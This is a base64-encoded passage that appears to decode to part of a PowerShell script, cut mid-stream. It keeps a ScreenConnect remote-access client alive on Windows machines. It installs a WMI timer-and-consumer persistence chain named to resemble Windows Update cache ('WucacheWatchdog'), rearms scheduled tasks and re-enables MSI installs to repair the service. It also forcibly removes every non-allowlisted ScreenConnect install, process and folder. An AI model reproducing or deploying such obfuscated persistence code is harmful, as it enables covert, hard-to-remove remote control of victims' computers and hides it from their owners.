JykgewogICAgICAgICAgICAgICAgY21kLmV4ZSAvYyAic2NodGFza3MuZXhlIC9SdW4gL1ROIGAi
JHRuYCIiIHwgT3V0LU51bGwKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAg
ICAgICRmYWlsKysKICAgICAgICAgICAgV3JpdGUtT3duTG9nICJ0YXNrc19jcmVhdGVfRkFJTCAk
KCRzcC5LZXkpICR0biIKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gInRhc2tzIG9rPSRvayBy
ZWFybWVkPSRyZWFybWVkIGZhaWw9JGZhaWwiCn0KCmZ1bmN0aW9uIFJlbW92ZS1XYXRjaGRvZyB7
CiAgICBmb3JlYWNoICgkY2xzIGluIEAoJ19fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcnLCdfX0V2
ZW50RmlsdGVyJywnQ29tbWFuZExpbmVFdmVudENvbnN1bWVyJywnX19JbnRlcnZhbFRpbWVySW5z
dHJ1Y3Rpb24nKSkgewogICAgICAgIEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNj
cmlwdGlvbiAtQ2xhc3MgJGNscyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAg
ICAgICAgIFdoZXJlLU9iamVjdCB7CiAgICAgICAgICAgICAgICAoJF8uTmFtZSAtZXEgJ1d1Y2Fj
aGVXYXRjaGRvZ0YnKSAtb3IgKCRfLk5hbWUgLWVxICdXdWNhY2hlV2F0Y2hkb2dDJykgLW9yCiAg
ICAgICAgICAgICAgICAoJF8uVGltZXJJZCAtZXEgJ1d1Y2FjaGVXYXRjaGRvZycpIC1vcgogICAg
ICAgICAgICAgICAgKCRfLkZpbHRlciAtYW5kICRfLkZpbHRlci5Ub1N0cmluZygpIC1saWtlICcq
V3VjYWNoZVdhdGNoZG9nRionKSAtb3IKICAgICAgICAgICAgICAgICgkXy5Db25zdW1lciAtYW5k
ICRfLkNvbnN1bWVyLlRvU3RyaW5nKCkgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dDKicpCiAgICAg
ICAgICAgIH0gfCBGb3JFYWNoLU9iamVjdCB7ICRfLkRlbGV0ZSgpIHwgT3V0LU51bGwgfQogICAg
fQp9CgpmdW5jdGlvbiBJbnN0YWxsLVdhdGNoZG9nIHsKICAgIGlmICgtbm90ICRNb25QYXRoKSB7
IHJldHVybiAkZmFsc2UgfQogICAgUmVtb3ZlLVdhdGNoZG9nCiAgICAkb2sgPSAkdHJ1ZQogICAg
dHJ5IHsKICAgICAgICBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlv
biAtQ2xhc3MgX19JbnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24gYAogICAgICAgICAgICAtQXJndW1l
bnRzIEB7IFRpbWVySWQgPSAnV3VjYWNoZVdhdGNoZG9nJzsgSW50ZXJ2YWxNaWxsaXNlY29uZHMg
PSAxODAwMDA7IFNraXBJZlBhc3NlZCA9ICRmYWxzZSB9IHwgT3V0LU51bGwKICAgICAgICAkZiA9
IFNldC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0V2
ZW50RmlsdGVyIGAKICAgICAgICAgICAgLUFyZ3VtZW50cyBAeyBOYW1lID0gJ1d1Y2FjaGVXYXRj
aGRvZ0YnOyBFdmVudE5hbWVzcGFjZSA9ICdyb290XGNpbXYyJzsgUXVlcnlMYW5ndWFnZSA9ICdX
UUwnOwogICAgICAgICAgICAgICAgICAgICAgICAgIFF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gX19U
aW1lckV2ZW50IFdIRVJFIFRpbWVySWQ9J1d1Y2FjaGVXYXRjaGRvZyciIH0KICAgICAgICAkYyA9
IFNldC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBDb21t
YW5kTGluZUV2ZW50Q29uc3VtZXIgYAogICAgICAgICAgICAtQXJndW1lbnRzIEB7IE5hbWUgPSAn
V3VjYWNoZVdhdGNoZG9nQyc7IENvbW1hbmRMaW5lVGVtcGxhdGUgPSAiY21kLmV4ZSAvYyBgIiRN
b25QYXRoYCIiOyBSdW5JbnRlcmFjdGl2ZWx5ID0gJGZhbHNlIH0KICAgICAgICBTZXQtV21pSW5z
dGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19GaWx0ZXJUb0NvbnN1
bWVyQmluZGluZyBgCiAgICAgICAgICAgIC1Bcmd1bWVudHMgQHsgRmlsdGVyID0gJGY7IENvbnN1
bWVyID0gJGMgfSB8IE91dC1OdWxsCiAgICB9IGNhdGNoIHsgJG9rID0gJGZhbHNlIH0KICAgIHJl
dHVybiAkb2sKfQoKZnVuY3Rpb24gVGVzdC1XYXRjaGRvZ0dyYXBoIHsKICAgICR0ID0gR2V0LVdt
aU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0ludGVydmFsVGlt
ZXJJbnN0cnVjdGlvbiAtRmlsdGVyICJUaW1lcklkPSdXdWNhY2hlV2F0Y2hkb2cnIiAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgJGYgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ug
cm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIgLUZpbHRlciAiTmFtZT0nV3Vj
YWNoZVdhdGNoZG9nRiciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAkYyA9IEdl
dC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExp
bmVFdmVudENvbnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0MnIiAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgJGIgPSAkbnVsbAogICAgaWYgKCRmIC1hbmQgJGMp
IHsKICAgICAgICAkYiA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlv
biAtQ2xhc3MgX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZyAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
b250aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkZpbHRlciAtbGlrZSAnKld1
Y2FjaGVXYXRjaGRvZ0YqJyAtYW5kICRfLkNvbnN1bWVyIC1saWtlICcqV3VjYWNoZVdhdGNoZG9n
QyonIH0gfAogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxCiAgICB9CiAgICByZXR1
cm4gW2Jvb2xdKCR0IC1hbmQgJGYgLWFuZCAkYyAtYW5kICRiKQp9CgpmdW5jdGlvbiBFbnN1cmUt
V2F0Y2hkb2cgewogICAgaWYgKFRlc3QtV2F0Y2hkb2dHcmFwaCkgeyByZXR1cm4gJ09LJyB9CiAg
ICBpZiAoLW5vdCAkTW9uUGF0aCkgeyByZXR1cm4gJ01JU1NJTkcnIH0KICAgIGlmIChJbnN0YWxs
LVdhdGNoZG9nKSB7IHJldHVybiAnUkVBUk1FRCcgfQogICAgcmV0dXJuICdGQUlMJwp9CgojIENv
cnJlY3QgMzItYml0ICsgNjQtYml0IEFSUCBoaXZlcy4gTDYgYW5kIGVhcmxpZXIgdXNlZCBhIHRy
dW5jYXRlZAojIFdPVzY0MzJOb2RlIHBhdGggKG1pc3NpbmcgTWljcm9zb2Z0XFdpbmRvd3MpIHNv
IEVWRVJZIDMyLWJpdCBTQyBwcm9kdWN0CiMgd2FzIGludmlzaWJsZSB0byByZXBhaXIvZXh0ZXJt
aW5hdGUvcmVnaXN0ZXJlZC4KJHNjcmlwdDpVbmluc3RhbGxSb290cyA9IEAoCiAgICAnSEtMTTpc
U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJywKICAg
ICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVy
c2lvblxVbmluc3RhbGwnCikKCmZ1bmN0aW9uIFRlc3QtU0NSZWdpc3RlcmVkKFtzdHJpbmddJEZp
bmdlcnByaW50KSB7CiAgICAjIEw4OiBORVZFUiB1c2UgcmV0dXJuIGluc2lkZSBGb3JFYWNoLU9i
amVjdCAtIGl0IG9ubHkgZXhpdHMgdGhlCiAgICAjIHBpcGVsaW5lIGl0ZXJhdGlvbiwgc28gdGhp
cyBmdW5jdGlvbiBhbHdheXMgZmVsbCB0aHJvdWdoIHRvICdubycKICAgICMgYW5kIHRoZSBtb24g
b3JwaGFuLWxhZGRlciBkZWxldGVkIGhlYWx0aHkgcmVnaXN0ZXJlZCBzZXJ2aWNlcy4KICAgIGlm
ICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ25vJyB9CiAgICAkbmFtZSA9ICJTY3JlZW5D
b25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgIGZvcmVhY2ggKCRyb290IGluICRzY3Jp
cHQ6VW5pbnN0YWxsUm9vdHMpIHsKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkg
eyBjb250aW51ZSB9CiAgICAgICAgZm9yZWFjaCAoJGtleSBpbiAoR2V0LUNoaWxkSXRlbSAkcm9v
dCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsKICAgICAgICAgICAgJGRuID0gKEdl
dC1JdGVtUHJvcGVydHkgJGtleS5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUp
LkRpc3BsYXlOYW1lCiAgICAgICAgICAgIGlmICgkZG4gLWFuZCAoJGRuIC1pZXEgJG5hbWUpIC1h
bmQgKCRrZXkuUFNDaGlsZE5hbWUgLWxpa2UgJ3sqfScpKSB7IHJldHVybiAneWVzJyB9CiAgICAg
ICAgfQogICAgfQogICAgcmV0dXJuICdubycKfQoKZnVuY3Rpb24gUmVwYWlyLVNDU2VydmljZShb
c3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgIyBSZWNyZWF0ZXMgYSBkZWxldGVkIFNDIHNlcnZp
Y2UgZW50cnkgYnkgcmVwYWlyaW5nIHRoZSBSRUdJU1RFUkVEIHByb2R1Y3QuCiAgICAjIG1zaWV4
ZWMgL2ZhIHtHVUlEfSByZXBhaXJzIGluIHBsYWNlIC0gaXQgZG9lcyBOT1QgcnVuIHRoZSBTQy1m
YW1pbHkKICAgICMgbWFqb3ItdXBncmFkZSByZW1vdmFsLCBzbyBvdGhlciBpbnN0YW5jZXMgYXJl
IHVudG91Y2hlZC4KICAgICMgTDU6IGFsc28gaGFuZGxlcyBwcmVzZW50LWJ1dC1TVE9QUEVEIHNl
cnZpY2VzIChyZXBhaXIgcmVzdG9yZXMgYmluYXJpZXMsCiAgICAjIHRoZW4gc3RhcnQpLiBPbmx5
IGEgUnVubmluZyBzZXJ2aWNlIGlzIGNvbnNpZGVyZWQgaGVhbHRoeS4KICAgIGlmICgtbm90ICRG
aW5nZXJwcmludCkgeyByZXR1cm4gJ25vLWZwJyB9CiAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0
IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAkbmFt
ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgaWYgKCRzdmMgLWFuZCAkc3ZjLlN0
YXR1cyAtZXEgJ1J1bm5pbmcnKSB7IHJldHVybiAnc3ZjLXJ1bm5pbmcnIH0KICAgICRndWlkID0g
JG51bGwKICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsKICAg
ICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBjb250aW51ZSB9CiAgICAgICAgZm9y
ZWFjaCAoJGtleSBpbiAoR2V0LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
b250aW51ZSkpIHsKICAgICAgICAgICAgJGRuID0gKEdldC1JdGVtUHJvcGVydHkgJGtleS5QU1Bh
dGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpLkRpc3BsYXlOYW1lCiAgICAgICAgICAg
IGlmICgkZG4gLWFuZCAoJGRuIC1pZXEgJG5hbWUpIC1hbmQgKCRrZXkuUFNDaGlsZE5hbWUgLWxp
a2UgJ3sqfScpKSB7ICRndWlkID0gJGtleS5QU0NoaWxkTmFtZTsgYnJlYWsgfQogICAgICAgIH0K
ICAgICAgICBpZiAoJGd1aWQpIHsgYnJlYWsgfQogICAgfQogICAgaWYgKC1ub3QgJGd1aWQpIHsg
cmV0dXJuICdub3QtcmVnaXN0ZXJlZCcgfQogICAgJiByZWcuZXhlIGRlbGV0ZSAnSEtMTVxTT0ZU
V0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kg
L2YgMj4mMSB8IE91dC1OdWxsCiAgICAmIHJlZy5leGUgYWRkICdIS0xNXFNPRlRXQVJFXFBvbGlj
aWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdP
UkQgL2QgMCAvZiAyPiYxIHwgT3V0LU51bGwKICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIg
Im1zaV9yZXBhaXJfJEZpbmdlcnByaW50LmxvZyIKICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2ll
eGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIvZmEgJGd1aWQgL3FuIC9ub3Jlc3RhcnQgL0wqdiBgIiRs
b2dgIiIgLVdhaXQgLVBhc3NUaHJ1CiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA4CiAgICAmIHNj
LmV4ZSBjb25maWcgIiRuYW1lIiBzdGFydD0gYXV0byAyPiYxIHwgT3V0LU51bGwKICAgICYgc2Mu
ZXhlIHN0YXJ0ICIkbmFtZSIgMj4mMSB8IE91dC1OdWxsCiAgICBTdGFydC1TbGVlcCAtU2Vjb25k
cyA0CiAgICAkc3ZjID0gR2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUKICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5TdGF0dXMgLWVxICdSdW5uaW5nJykg
eyByZXR1cm4gInN2Yy1yZXN0b3JlZCBleGl0PSQoJHAuRXhpdENvZGUpIiB9CiAgICBpZiAoJHN2
YykgeyByZXR1cm4gInN2Yy1zdGlsbC1zdG9wcGVkIGV4aXQ9JCgkcC5FeGl0Q29kZSkiIH0KICAg
IHJldHVybiAic3ZjLXN0aWxsLW1pc3NpbmcgZXhpdD0kKCRwLkV4aXRDb2RlKSIKfQoKZnVuY3Rp
b24gSW52b2tlLUV4dGVybWluYXRlIHsKICAgICMgTDc6IHRydWUgcmVtb3ZhbC4gQ29ycmVjdCBX
T1c2NDMyTm9kZSBoaXZlICsgbXNpZXhlYyArIFVuaW5zdGFsbFN0cmluZwogICAgIyBmYWxsYmFj
ayArIGZvcmNlIGRpciBudWtlLiBLZWVwIG9ubHkgdGhlIHR3byBhbGxvd2xpc3RlZCBmaW5nZXJw
cmludHMuCiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdleHRlcm1pbmF0ZS5sb2cnCiAg
ICAka2VlcCA9IEAoJzVmNjAxMDU3OTg1MmU1MDcnLCdmODYxYzgxNDBkNDUzNDI3JywnOTkwODE5
OGU2NjhlNDc1MCcpCiAgICAkbiA9IEB7IHN2YyA9IDA7IHByb2MgPSAwOyBkaXIgPSAwOyBwcm9k
dWN0ID0gMDsgcm1tID0gMDsgZmFpbCA9IDAgfQogICAgZnVuY3Rpb24gTG9nKFtzdHJpbmddJG0p
IHsKICAgICAgICAkbGluZSA9ICd7MH0gezF9JyAtZiAoR2V0LURhdGUgLUZvcm1hdCAneXl5eS1N
TS1kZCBISDptbTpzcycpLCAkbQogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9n
IC1WYWx1ZSAkbGluZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgIFdyaXRl
LU91dHB1dCAkbGluZQogICAgfQogICAgZnVuY3Rpb24gSXMtS2VlcGVyKFtzdHJpbmddJHMpIHsK
ICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZhbHNlIH0KICAgICAgICBmb3JlYWNoICgk
ayBpbiAka2VlcCkgeyBpZiAoJHMgLWxpa2UgIiokayoiKSB7IHJldHVybiAkdHJ1ZSB9IH0KICAg
ICAgICByZXR1cm4gJGZhbHNlCiAgICB9CiAgICBmdW5jdGlvbiBGb3JjZS1SZW1vdmVEaXIoW3N0
cmluZ10kZCkgewogICAgICAgIGlmICgtbm90ICRkIC1vciAtbm90IChUZXN0LVBhdGggLUxpdGVy
YWxQYXRoICRkKSkgeyByZXR1cm4gJHRydWUgfQogICAgICAgIEdldC1DaW1JbnN0YW5jZSBXaW4z
Ml9Qcm9jZXNzIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwKICAgICAgICAgICAgV2hl
cmUtT2JqZWN0IHsgJF8uRXhlY3V0YWJsZVBhdGggLWFuZCAkXy5FeGVjdXRhYmxlUGF0aC5TdGFy
dHNXaXRoKCRkLCBbU3RyaW5nQ29tcGFyaXNvbl06Ok9yZGluYWxJZ25vcmVDYXNlKSB9IHwKICAg
ICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyBTdG9wLVByb2Nlc3MgLUlkICRfLlByb2Nlc3NJZCAt
Rm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfQogICAgICAgICYgdGFrZW93bi5l
eGUgL0YgJGQgL1IgL0QgWSAyPiYxIHwgT3V0LU51bGwKICAgICAgICAmIGljYWNscy5leGUgJGQg
L2dyYW50ICcqUy0xLTUtMzItNTQ0OkYnIC9UIC9DIC9RIDI+JjEgfCBPdXQtTnVsbAogICAgICAg
ICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJ0FkbWluaXN0cmF0b3JzOkYnIC9UIC9DIC9RIDI+JjEg
fCBPdXQtTnVsbAogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZCAtUmVjdXJzZSAt
Rm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICBpZiAoVGVzdC1QYXRo
IC1MaXRlcmFsUGF0aCAkZCkgewogICAgICAgICAgICBjbWQuZXhlIC9jICJhdHRyaWIgLWggLXMg
LXIgL3MgL2QgYCIkZFwqLipgIiIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgICAgIGNtZC5leGUg
L2MgInJtZGlyIC9zIC9xIGAiJGRgIiIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgfQogICAgICAg
IGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSB7CiAgICAgICAgICAgICRlbXB0eSA9IEpv
aW4tUGF0aCAkZW52OlRFTVAgKCJvd25fZW1wdHlfIiArIFtndWlkXTo6TmV3R3VpZCgpLlRvU3Ry
aW5nKCdOJykpCiAgICAgICAgICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGgg
JGVtcHR5IC1Gb3JjZSB8IE91dC1OdWxsCiAgICAgICAgICAgICYgcm9ib2NvcHkuZXhlICRlbXB0
eSAkZCAvTUlSIC9SOjAgL1c6MCAyPiYxIHwgT3V0LU51bGwKICAgICAgICAgICAgUmVtb3ZlLUl0
ZW0gLUxpdGVyYWxQYXRoICRlbXB0eSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUKICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRkIC1SZWN1cnNlIC1Gb3Jj
ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgIH0KICAgICAgICByZXR1cm4g
LW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkKICAgIH0KICAgIGZ1bmN0aW9uIFVuaW5z
dGFsbC1Qcm9kdWN0S2V5KCRrZXkpIHsKICAgICAgICAkZ3VpZCA9ICRrZXkuUFNDaGlsZE5hbWUK
ICAgICAgICAkcHJvcCA9IEdldC1JdGVtUHJvcGVydHkgJGtleS5QU1BhdGggLUVycm9yQWN0aW9u
IFNpbGVudGx5Q29udGludWUKICAgICAgICAkZG4gPSAkcHJvcC5EaXNwbGF5TmFtZQogICAgICAg
IGlmICgkZ3VpZCAtbGlrZSAneyp9JykgewogICAgICAgICAgICAkcCA9IFN0YXJ0LVByb2Nlc3Mg
bXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL3ggJGd1aWQgL3FuIC9ub3Jlc3RhcnQgUkVCT09U
PVJlYWxseVN1cHByZXNzIiAtV2FpdCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbgogICAg
ICAgICAgICBMb2cgInByb2R1Y3RfbXNpZXhlYyBbJGRuXSBndWlkPSRndWlkIGV4aXQ9JCgkcC5F
eGl0Q29kZSkiCiAgICAgICAgICAgIGlmICgkcC5FeGl0Q29kZSAtaW4gMCwgMTYwNSwgMTYxNCwg
MzAxMCkgeyByZXR1cm4gJHRydWUgfQogICAgICAgIH0KICAgICAgICAkdXMgPSAkcHJvcC5Vbmlu
c3RhbGxTdHJpbmcKICAgICAgICBpZiAoJHVzKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAg
ICAgICAgICBpZiAoJHVzIC1tYXRjaCAnKD9pKW1zaWV4ZWMnKSB7CiAgICAgICAgICAgICAgICAg
ICAgJGFyZ3MgPSAoJHVzIC1yZXBsYWNlICcoP2kpXi4qbXNpZXhlYyhcLmV4ZSk/XHMqJywgJycp
CiAgICAgICAgICAgICAgICAgICAgaWYgKCRhcmdzIC1ub3RtYXRjaCAnL3FuJykgeyAkYXJncyA9
ICIkYXJncyAvcW4gL25vcmVzdGFydCIgfQogICAgICAgICAgICAgICAgICAgICRwID0gU3RhcnQt
UHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICRhcmdzIC1XYWl0IC1QYXNzVGhydSAt
V2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAgICAgICAgICAgICAgTG9nICJwcm9kdWN0X3VuaW5z
dGFsbHN0cmluZ19tc2kgWyRkbl0gZXhpdD0kKCRwLkV4aXRDb2RlKSIKICAgICAgICAgICAgICAg
ICAgICByZXR1cm4gKCRwLkV4aXRDb2RlIC1pbiAwLCAxNjA1LCAxNjE0LCAzMDEwKQogICAgICAg
ICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkcCA9IFN0YXJ0LVByb2Nlc3Mg
Y21kLmV4ZSAtQXJndW1lbnRMaXN0ICIvYyAkdXMgL1MgL3NpbGVudCAvcXVpZXQgL3FuIiAtV2Fp
dCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbgogICAgICAgICAgICAgICAgICAgIExvZyAi
cHJvZHVjdF91bmluc3RhbGxzdHJpbmdfZXhlIFskZG5dIGV4aXQ9JCgkcC5FeGl0Q29kZSkiCiAg
ICAgICAgICAgICAgICAgICAgcmV0dXJuICgkcC5FeGl0Q29kZSAtZXEgMCkKICAgICAgICAgICAg
ICAgIH0KICAgICAgICAgICAgfSBjYXRjaCB7IExvZyAicHJvZHVjdF91bmluc3RhbGxzdHJpbmdf
RkFJTCBbJGRuXSAkXyIgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9Cgog
ICAgTG9nICdleHRlcm1pbmF0ZV9lbmdpbmVfTDdfYmVnaW4nCgogICAgIyAxLiBmb3JlaWduIFND
IHByb2R1Y3RzIGZyb20gQk9USCBjb3JyZWN0IEFSUCBoaXZlcwogICAgJHNlZW4gPSBAe30KICAg
IGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsKICAgICAgICBpZiAo
LW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBMb2cgImhpdmVfbWlzc2luZyAkcm9vdCI7IGNvbnRp
bnVlIH0KICAgICAgICBMb2cgImhpdmVfc2NhbiAkcm9vdCIKICAgICAgICBHZXQtQ2hpbGRJdGVt
ICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgewog
ICAgICAgICAgICAkcHJvcCA9IEdldC1JdGVtUHJvcGVydHkgJF8uUFNQYXRoIC1FcnJvckFjdGlv
biBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgICAgICRkbiA9ICRwcm9wLkRpc3BsYXlOYW1lCiAg
ICAgICAgICAgIGlmICgtbm90ICRkbikgeyByZXR1cm4gfQogICAgICAgICAgICBpZiAoJGRuIC1u
b3RtYXRjaCAnKD9pKVNjcmVlbkNvbm5lY3RccytDbGllbnRccypcKChbMC05QS1GYS1mXXsxNn0p
XCknKSB7IHJldHVybiB9CiAgICAgICAgICAgICRmcCA9ICRNYXRjaGVzWzFdLlRvTG93ZXIoKQog
ICAgICAgICAgICBpZiAoJGZwIC1pbiAka2VlcCkgeyByZXR1cm4gfQogICAgICAgICAgICBpZiAo
JHNlZW4uQ29udGFpbnNLZXkoJF8uUFNDaGlsZE5hbWUpKSB7IHJldHVybiB9CiAgICAgICAgICAg
ICRzZWVuWyRfLlBTQ2hpbGROYW1lXSA9ICR0cnVlCiAgICAgICAgICAgIGlmIChVbmluc3RhbGwt
UHJvZHVjdEtleSAkXykgeyAkbi5wcm9kdWN0KysgfSBlbHNlIHsgJG4uZmFpbCsrOyBMb2cgInBy
b2R1Y3RfUkVNT1ZFX0ZBSUxFRCBbJGRuXSIgfQogICAgICAgIH0KICAgIH0KCiAgICAjIDIuIGZv
cmVpZ24gU0Mgc2VydmljZXMKICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1FcnJv
ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAn
U2NyZWVuQ29ubmVjdCBDbGllbnQqJyB9KSkgewogICAgICAgIGlmIChJcy1LZWVwZXIgJHN2Yy5O
YW1lKSB7IGNvbnRpbnVlIH0KICAgICAgICAmIHNjLmV4ZSBzdG9wICIkKCRzdmMuTmFtZSkiIDI+
JjEgfCBPdXQtTnVsbAogICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNjAwCiAgICAg
ICAgJiBzYy5leGUgZGVsZXRlICIkKCRzdmMuTmFtZSkiIDI+JjEgfCBPdXQtTnVsbAogICAgICAg
ICRuLnN2YysrOyBMb2cgInN2Y19kZWxldGVkICQoJHN2Yy5OYW1lKSIKICAgIH0KCiAgICAjIDMu
IGZvcmVpZ24gU0MgcHJvY2Vzc2VzIChraWxsIGV2ZW4gd2hlbiBFeGVjdXRhYmxlUGF0aCBpcyBu
dWxsKQogICAgR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3MgLUZpbHRlciAiTmFtZSBsaWtl
ICdTY3JlZW5Db25uZWN0JSciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFj
aC1PYmplY3QgewogICAgICAgICRleGUgPSAkXy5FeGVjdXRhYmxlUGF0aAogICAgICAgICRjbWQg
PSAkXy5Db21tYW5kTGluZQogICAgICAgICRrZWVwZXIgPSAoSXMtS2VlcGVyICRleGUpIC1vciAo
SXMtS2VlcGVyICRjbWQpCiAgICAgICAgaWYgKC1ub3QgJGtlZXBlcikgewogICAgICAgICAgICBT
dG9wLVByb2Nlc3MgLUlkICRfLlByb2Nlc3NJZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUKICAgICAgICAgICAgJG4ucHJvYysrOyBMb2cgInByb2Nfa2lsbGVkIHBpZD0kKCRf
LlByb2Nlc3NJZCkgZXhlPSRleGUiCiAgICAgICAgfQogICAgfQoKICAgICMgNC4gZm9yZWlnbiBT
QyBpbnN0YWxsIGRpcnMgKFBGICsgUEY4NikKICAgIGZvcmVhY2ggKCRiYXNlIGluIEAoJGVudjpQ
cm9ncmFtRmlsZXMsICR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSkpIHsKICAgICAgICBpZiAoLW5v
dCAkYmFzZSAtb3IgLW5vdCAoVGVzdC1QYXRoICRiYXNlKSkgeyBjb250aW51ZSB9CiAgICAgICAg
R2V0LUNoaWxkSXRlbSAtTGl0ZXJhbFBhdGggJGJhc2UgLURpcmVjdG9yeSAtRm9yY2UgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5O
YW1lIC1saWtlICdTY3JlZW5Db25uZWN0KicgfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAg
ICAgICAgICRkID0gJF8uRnVsbE5hbWUKICAgICAgICAgICAgICAgIGlmIChJcy1LZWVwZXIgJGQp
